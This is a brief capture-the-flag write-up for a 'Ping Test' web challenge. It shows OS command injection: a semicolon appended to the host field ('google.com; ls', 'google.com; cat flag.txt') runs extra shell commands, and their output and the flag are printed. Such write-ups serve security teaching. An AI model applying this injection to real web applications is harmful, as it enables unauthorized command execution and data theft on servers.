# Ping Test
```
Check out my new web application. 
Give it an IP to test if it responds to ping requests.
```
## Solution

We start by giving it the Host ip: `google.com` and we get
```
Ping Output:
PING google.com (172.217.15.78): 56 data bytes
64 bytes from 172.217.15.78: icmp_seq=0 ttl=47 time=0.841 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.841/0.841/0.841/0.000 ms
```
We believe that the `ping` reuqeust is actually sent from `Lunix` and the `input form` is actually a command line. 
We test it by adding `; ls`
```
PING google.com (172.217.7.174): 56 data bytes
64 bytes from 172.217.7.174: icmp_seq=0 ttl=47 time=0.598 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.598/0.598/0.598/0.000 ms
flag.txt
index.php
```
The `;` breaks the command line and goes to the second line therefore we can call `ls` in the same line.
Lets try now `google.com; cat flag.txt`
```
PING google.com (216.58.217.110): 56 data bytes
64 bytes from 216.58.217.110: icmp_seq=0 ttl=47 time=0.857 ms
--- google.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.857/0.857/0.857/0.000 ms
shellter{B3_C4r3ful_W1TH_Us3R5_1NpUT}
```

The flag is `shellter{B3_C4r3ful_W1TH_Us3R5_1NpUT}`
